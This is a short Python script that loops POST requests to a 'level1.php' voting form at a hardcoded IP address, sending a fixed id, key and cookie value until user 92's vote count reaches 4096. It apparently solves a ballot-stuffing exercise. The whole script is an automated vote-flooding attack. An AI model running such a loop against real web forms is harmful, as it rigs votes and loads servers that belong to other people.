#!/usr/bin/python3
#http://docs.python-requests.org/en/master/user/quickstart/
import requests
header =  {'Content-Type': 'application/x-www-form-urlencoded',}
URL = 'http://54.221.6.249/level1.php'
cookies = { 'HoldTheDoor': '0'}
payload = {
    'id': '92',
    'holdthedoor': 'Submit',
    'key': '0'
}

r = requests.get(URL)
while "92    </td>\n    <td>\n4096" not in r.text:
    r = requests.post(URL, data=payload, headers=header, cookies=cookies)
print("Job's done")
